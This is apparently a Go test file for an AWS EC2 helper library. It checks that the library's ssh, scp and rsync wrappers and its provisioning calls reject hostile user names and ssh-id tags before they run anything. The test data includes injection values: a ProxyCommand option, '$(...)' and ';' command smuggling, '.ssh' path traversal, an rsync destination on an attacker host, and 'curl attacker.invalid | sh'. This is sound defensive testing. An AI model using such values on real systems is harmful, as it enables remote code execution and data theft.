package lib

import (
	"context"
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	ec2types "github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/gofrs/uuid"
)

// installEC2TransportStubs makes recording ssh, scp, rsync, bash and callback
// executables the only programs on PATH. The returned function reads every
// recorded argv, starting with the program name.
func installEC2TransportStubs(t *testing.T) func() [][]string {
	t.Helper()
	dir := t.TempDir()
	log := filepath.Join(dir, "argv")
	for _, name := range []string{"ssh", "scp", "rsync", "bash", "aws-ec2-ip-callback"} {
		script := "#!/bin/sh\nprintf '%s\\0' \"$#\" \"${0##*/}\" \"$@\" >> \"$LIBAWS_EC2_TRANSPORT_LOG\"\n"
		if err := os.WriteFile(filepath.Join(dir, name), []byte(script), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("PATH", dir)
	t.Setenv("LIBAWS_EC2_TRANSPORT_LOG", log)
	return func() [][]string {
		t.Helper()
		data, err := os.ReadFile(log)
		if os.IsNotExist(err) {
			return nil
		}
		if err != nil {
			t.Fatal(err)
		}
		fields := strings.Split(strings.TrimSuffix(string(data), "\x00"), "\x00")
		var calls [][]string
		for i := 0; i < len(fields); {
			n, err := strconv.Atoi(fields[i])
			if err != nil || i+2+n > len(fields) {
				t.Fatalf("malformed transport record: %q", data)
			}
			calls = append(calls, fields[i+1:i+2+n])
			i += 2 + n
		}
		return calls
	}
}

func ec2TransportTestInstance(id string, tags ...string) ec2types.Instance {
	instance := ec2types.Instance{
		InstanceId:       aws.String(id),
		PublicDnsName:    aws.String(id + ".example.invalid"),
		PrivateIpAddress: aws.String("10.0.0.1"),
	}
	for i := 0; i+1 < len(tags); i += 2 {
		instance.Tags = append(instance.Tags, ec2types.Tag{Key: aws.String(tags[i]), Value: aws.String(tags[i+1])})
	}
	return instance
}

type ec2TransportTestCall struct {
	name  string
	multi bool // accepts several instances
	run   func(instances []ec2types.Instance, user, key string) error
}

// Every public entry point that starts ssh, scp or rsync for given instances.
var ec2TransportTestCalls = []ec2TransportTestCall{
	{"rsync-upload", true, func(instances []ec2types.Instance, user, key string) error {
		_, err := EC2Rsync(context.Background(), &EC2RsyncInput{Source: "local dir/", Destination: ":remote dir/", Instances: instances, User: user, Key: key})
		return err
	}},
	{"rsync-download", true, func(instances []ec2types.Instance, user, key string) error {
		_, err := EC2Rsync(context.Background(), &EC2RsyncInput{Source: ":remote dir/", Destination: "local dir/", Instances: instances, User: user, Key: key})
		return err
	}},
	{"scp", true, func(instances []ec2types.Instance, user, key string) error {
		_, err := EC2Scp(context.Background(), &EC2ScpInput{Source: "local file", Destination: ":remote file", Instances: instances, User: user, Key: key})
		return err
	}},
	{"ssh", true, func(instances []ec2types.Instance, user, key string) error {
		_, err := EC2Ssh(context.Background(), &EC2SshInput{Cmd: "true", Instances: instances, User: user, Key: key, NoPrint: true})
		return err
	}},
	{"login", false, func(instances []ec2types.Instance, user, key string) error {
		return EC2SshLogin(instances[0], user, key)
	}},
}

var ec2TransportHostileUsers = []string{
	"x@attacker.invalid:/loot/ --out-format=", // another rsync destination host
	"x /tmp/victim/ y",                        // extra local source
	"x@attacker.invalid:/a /tmp/victim/",      // local rsync destination
	"-oProxyCommand=false",
	"fixture@other.example.invalid",
	"fixture:/tmp",
	"$(false)",
	"fixture;false",
	"fixture\n",
}

func TestEC2TransportRejectsHostileUsers(t *testing.T) {
	for _, call := range ec2TransportTestCalls {
		for _, user := range ec2TransportHostileUsers {
			for _, source := range []string{"tag", "flag"} {
				t.Run(call.name+"/"+source+"/"+strconv.Quote(user), func(t *testing.T) {
					recorded := installEC2TransportStubs(t)
					var err error
					if source == "tag" {
						err = call.run([]ec2types.Instance{ec2TransportTestInstance("i-1", "user", user)}, "", "")
					} else {
						err = call.run([]ec2types.Instance{ec2TransportTestInstance("i-1", "user", "fixture")}, user, "")
					}
					if calls := recorded(); err == nil || !strings.Contains(err.Error(), "invalid ssh user") || len(calls) != 0 {
						t.Fatalf("hostile user: error=%v started=%q", err, calls)
					}
				})
			}
		}
	}
}

func TestEC2TransportRejectsHostileSshIDs(t *testing.T) {
	valid := uuid.Must(uuid.NewV4()).String()
	for _, call := range ec2TransportTestCalls {
		for _, id := range []string{
			"../../../../home/fixture/.ssh",
			valid + " -o ProxyCommand=false",
			strings.ToUpper(valid),
			"{" + valid + "}",
			strings.ReplaceAll(valid, "-", ""),
			"",
		} {
			t.Run(call.name+"/"+strconv.Quote(id), func(t *testing.T) {
				recorded := installEC2TransportStubs(t)
				instances := []ec2types.Instance{ec2TransportTestInstance("i-2", "user", "fixture", "ssh-id", id)}
				if call.multi {
					// A valid first instance must not start before the second is checked.
					instances = append([]ec2types.Instance{ec2TransportTestInstance("i-1", "user", "fixture", "ssh-id", valid)}, instances...)
				}
				err := call.run(instances, "", "")
				if calls := recorded(); err == nil || !strings.Contains(err.Error(), "invalid ssh-id tag") || len(calls) != 0 {
					t.Fatalf("hostile ssh-id: error=%v started=%q", err, calls)
				}
			})
		}
	}
}

func TestEC2TransportArgv(t *testing.T) {
	t.Setenv("RSYNC_OPTIONS", "--exclude=*.tmp  --chmod=F600")
	// A well-formed ssh-id without a local key falls back to the given key.
	instance := ec2TransportTestInstance("i-1", "user", "fixture", "ssh-id", uuid.Must(uuid.NewV4()).String())
	host := "fixture@i-1.example.invalid"
	rsync := []string{"rsync", "-avh", "--delete", "-e", "ssh -i /keys/id_ed25519 -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no", "--exclude=*.tmp", "--chmod=F600", "--"}
	ssh := []string{"ssh", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", "-i", "/keys/id_ed25519", "-o", "IdentitiesOnly=yes", "--", host}
	want := map[string][]string{
		"rsync-upload":   append(slices.Clone(rsync), "local dir/", host+":remote dir/"),
		"rsync-download": append(slices.Clone(rsync), host+":remote dir/", "local dir/"),
		"scp":            {"scp", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", "-o", "IdentitiesOnly=yes", "-i", "/keys/id_ed25519", "--", "local file", host + ":remote file"},
		"ssh":            append(slices.Clone(ssh), ec2SshRemoteCmdFailureMessage("#!/bin/bash\nset -eou pipefail\ntrue", "", "failure on i-1")),
		"login":          ssh,
	}
	for _, call := range ec2TransportTestCalls {
		for _, user := range []string{"", "fixture"} { // tag, then flag
			t.Run(call.name+"/"+strconv.Quote(user), func(t *testing.T) {
				recorded := installEC2TransportStubs(t)
				if err := call.run([]ec2types.Instance{instance}, user, "/keys/id_ed25519"); err != nil {
					t.Fatal(err)
				}
				if calls := recorded(); len(calls) != 1 || !slices.Equal(calls[0], want[call.name]) {
					t.Fatalf("argv:\n got %q\nwant %q", calls, want[call.name])
				}
			})
		}
	}
}

func TestEC2TransportKeyPaths(t *testing.T) {
	instance := ec2TransportTestInstance("i-1", "user", "fixture")
	for _, key := range []string{"/keys/my key", "/keys/it's", "/keys/a\"b", "/keys/a\tb"} {
		for _, call := range ec2TransportTestCalls {
			t.Run(call.name+"/"+strconv.Quote(key), func(t *testing.T) {
				recorded := installEC2TransportStubs(t)
				err := call.run([]ec2types.Instance{instance}, "", key)
				calls := recorded()
				if strings.HasPrefix(call.name, "rsync") {
					// rsync would re-split this path inside its -e command.
					if err == nil || !strings.Contains(err.Error(), "rsync key path") || len(calls) != 0 {
						t.Fatalf("rsync key: error=%v started=%q", err, calls)
					}
					return
				}
				if err != nil || len(calls) != 1 || !slices.Contains(calls[0], key) {
					t.Fatalf("key must stay one argument: error=%v started=%q", err, calls)
				}
			})
		}
	}
}

func TestEC2SshUser(t *testing.T) {
	for _, user := range []string{"fixture", "ec2-user", "admin", "ubuntu", "alpine", "user", "_svc", "a", strings.Repeat("a", 32)} {
		if got, err := EC2SshUser([]ec2types.Instance{ec2TransportTestInstance("i-1", "user", user)}, ""); err != nil || got != user {
			t.Errorf("tag %q: got %q, %v", user, got, err)
		}
	}
	for _, user := range append([]string{"Fixture", "1fixture", "-", strings.Repeat("a", 33), "fixture.name", "fixture$"}, ec2TransportHostileUsers...) {
		if _, err := EC2SshUser(nil, user); err == nil || !strings.Contains(err.Error(), "invalid ssh user") {
			t.Errorf("flag %q: %v", user, err)
		}
	}
	for name, instances := range map[string][]ec2types.Instance{
		"missing":  {ec2TransportTestInstance("i-1")},
		"empty":    {ec2TransportTestInstance("i-1", "user", "")},
		"mismatch": {ec2TransportTestInstance("i-1", "user", "fixture"), ec2TransportTestInstance("i-2", "user", "admin")},
		"none":     nil,
	} {
		if user, err := EC2SshUser(instances, ""); err == nil {
			t.Errorf("%s: got %q", name, user)
		}
	}
}

type ec2TransportTestRoundTrip func(*http.Request) (*http.Response, error)

func (fn ec2TransportTestRoundTrip) RoundTrip(r *http.Request) (*http.Response, error) { return fn(r) }

// installEC2TransportTestClients answers EC2 and IAM queries from respond and
// records every action. An empty response fails an unexpected call.
func installEC2TransportTestClients(t *testing.T, respond func(action string) string) *[]string {
	t.Helper()
	var calls []string
	cfg := aws.Config{
		Region: "us-east-1", Credentials: aws.AnonymousCredentials{}, RetryMaxAttempts: 1,
		HTTPClient: &http.Client{Transport: ec2TransportTestRoundTrip(func(r *http.Request) (*http.Response, error) {
			if err := r.ParseForm(); err != nil {
				return nil, err
			}
			action := r.Form.Get("Action")
			calls = append(calls, action)
			body := respond(action)
			if body == "" {
				return nil, fmt.Errorf("unexpected API call: %s", action)
			}
			return &http.Response{StatusCode: http.StatusOK, Header: http.Header{}, Body: io.NopCloser(strings.NewReader(body)), Request: r}, nil
		})},
	}
	oldEC2, oldIAM := ec2Client, iamClient
	ec2Client, iamClient = ec2.NewFromConfig(cfg), iam.NewFromConfig(cfg)
	t.Cleanup(func() { ec2Client, iamClient = oldEC2, oldIAM })
	return &calls
}

func ec2TransportTestTagSet(tags ...string) string {
	var body strings.Builder
	body.WriteString("<tagSet>")
	for i := 0; i+1 < len(tags); i += 2 {
		body.WriteString("<item><key>")
		_ = xml.EscapeText(&body, []byte(tags[i]))
		body.WriteString("</key><value>")
		_ = xml.EscapeText(&body, []byte(tags[i+1]))
		body.WriteString("</value></item>")
	}
	body.WriteString("</tagSet>")
	return body.String()
}

func ec2TransportTestInstanceXML(id, state string, tags ...string) string {
	return "<item><instanceId>" + id + "</instanceId><instanceState><name>" + state + "</name></instanceState>" +
		"<launchTime>2026-01-01T00:00:00.000Z</launchTime><dnsName>host " + id + ".example.invalid</dnsName>" +
		"<privateIpAddress>10.0.0.1</privateIpAddress>" + ec2TransportTestTagSet(tags...) + "</item>"
}

func ec2TransportTestDescribe(instances ...string) string {
	return "<DescribeInstancesResponse><reservationSet><item><instancesSet>" + strings.Join(instances, "") +
		"</instancesSet></item></reservationSet></DescribeInstancesResponse>"
}

func TestEC2WaitSshValidatesBeforeCallback(t *testing.T) {
	for _, test := range []struct {
		name, user string
		instances  []string
		reads      int
	}{
		{"flag", "-oProxyCommand=false", []string{ec2TransportTestInstanceXML("i-1", "running", "user", "fixture")}, 0},
		{"user-tag", "", []string{ec2TransportTestInstanceXML("i-1", "running", "user", "x@attacker.invalid:/loot/ --out-format=")}, 1},
		{"ssh-id-tag", "", []string{ec2TransportTestInstanceXML("i-1", "running", "user", "fixture", "ssh-id", "../../../../home/fixture/.ssh")}, 1},
		{"mixed-users", "", []string{ec2TransportTestInstanceXML("i-1", "running", "user", "fixture"), ec2TransportTestInstanceXML("i-2", "running", "user", "admin")}, 1},
	} {
		t.Run(test.name, func(t *testing.T) {
			recorded := installEC2TransportStubs(t)
			calls := installEC2TransportTestClients(t, func(action string) string {
				if action != "DescribeInstances" {
					return ""
				}
				return ec2TransportTestDescribe(test.instances...)
			})
			ready, err := EC2WaitSsh(context.Background(), &EC2WaitSshInput{Selectors: []string{"i-1"}, User: test.user, MaxWaitSeconds: 1})
			if started := recorded(); err == nil || len(ready) != 0 || len(started) != 0 || len(*calls) != test.reads {
				t.Fatalf("error=%v ready=%v started=%q calls=%v", err, ready, started, *calls)
			}
		})
	}
	t.Run("valid", func(t *testing.T) {
		recorded := installEC2TransportStubs(t)
		calls := installEC2TransportTestClients(t, func(action string) string {
			if action != "DescribeInstances" {
				return ""
			}
			return ec2TransportTestDescribe(ec2TransportTestInstanceXML("i-1", "running", "user", "fixture"))
		})
		ready, err := EC2WaitSsh(context.Background(), &EC2WaitSshInput{Selectors: []string{"i-1"}, MaxWaitSeconds: 1})
		if err != nil || !slices.Equal(ready, []string{"i-1"}) || !slices.Equal(*calls, []string{"DescribeInstances"}) {
			t.Fatalf("error=%v ready=%v calls=%v", err, ready, *calls)
		}
		// The callback receives each address as one argument, never shell text.
		started := recorded()
		callback := []string{"bash", "-c", `aws-ec2-ip-callback "$@" && sleep 1`, "aws-ec2-ip-callback", "host i-1.example.invalid"}
		if len(started) != 2 || !slices.Equal(started[0], callback) || started[1][0] != "ssh" || !slices.Contains(started[1], "fixture@host i-1.example.invalid") {
			t.Fatalf("started %q", started)
		}
	})
}

func TestEC2ProvisioningRejectsHostileUsers(t *testing.T) {
	for _, user := range append([]string{""}, ec2TransportHostileUsers...) {
		t.Run(strconv.Quote(user), func(t *testing.T) {
			calls := installEC2TransportTestClients(t, func(string) string { return "" })
			config := func() *EC2Config {
				return &EC2Config{NumInstances: 1, Name: "fixture", UserName: user, SubnetIds: []string{"subnet-1"}, TempKey: true}
			}
			if _, err := makeInit(config()); err == nil {
				t.Error("makeInit accepted user")
			}
			if _, err := EC2NewInstances(context.Background(), config()); err == nil {
				t.Error("EC2NewInstances accepted user")
			}
			if _, err := EC2RequestSpotFleet(context.Background(), ec2types.AllocationStrategyLowestPrice, config()); err == nil {
				t.Error("EC2RequestSpotFleet accepted user")
			}
			if len(*calls) != 0 {
				t.Errorf("AWS calls before validation: %v", *calls)
			}
		})
	}
}

func TestEC2AmiUserTags(t *testing.T) {
	for _, test := range []struct{ user, want string }{
		{"admin", "admin"},
		{"x@attacker.invalid:/loot/ --out-format=", ""},
		{"admin; curl attacker.invalid | sh", ""},
	} {
		t.Run(strconv.Quote(test.user), func(t *testing.T) {
			installEC2TransportTestClients(t, func(action string) string {
				if action != "DescribeImages" {
					return ""
				}
				return "<DescribeImagesResponse><imagesSet><item><imageId>ami-1</imageId>" + ec2TransportTestTagSet("user", test.user) + "</item></imagesSet></DescribeImagesResponse>"
			})
			user, err := EC2AmiUser(context.Background(), "ami-1")
			if user != test.want || (err == nil) != (test.want != "") {
				t.Fatalf("user=%q error=%v", user, err)
			}
		})
	}
	for _, test := range []struct{ user, want string }{
		{"admin", "ami-00000000000000001"},
		{"admin; curl attacker.invalid | sh", ""},
	} {
		t.Run("new-ami/"+strconv.Quote(test.user), func(t *testing.T) {
			calls := installEC2TransportTestClients(t, func(action string) string {
				switch action {
				case "DescribeInstances":
					return ec2TransportTestDescribe(ec2TransportTestInstanceXML("i-1", "stopped", "Name", "fixture", "user", test.user))
				case "CreateImage":
					return "<CreateImageResponse><imageId>ami-00000000000000001</imageId></CreateImageResponse>"
				}
				return ""
			})
			// A hostile tag must not be copied to the AMI and its snapshots.
			id, err := EC2NewAmi(context.Background(), &EC2NewAmiInput{Selectors: []string{"i-1"}})
			wantCalls := []string{"DescribeInstances"}
			if test.want != "" {
				wantCalls = append(wantCalls, "CreateImage")
			}
			if id != test.want || (err == nil) != (test.want != "") || !slices.Equal(*calls, wantCalls) {
				t.Fatalf("id=%q error=%v calls=%v", id, err, *calls)
			}
		})
	}
}
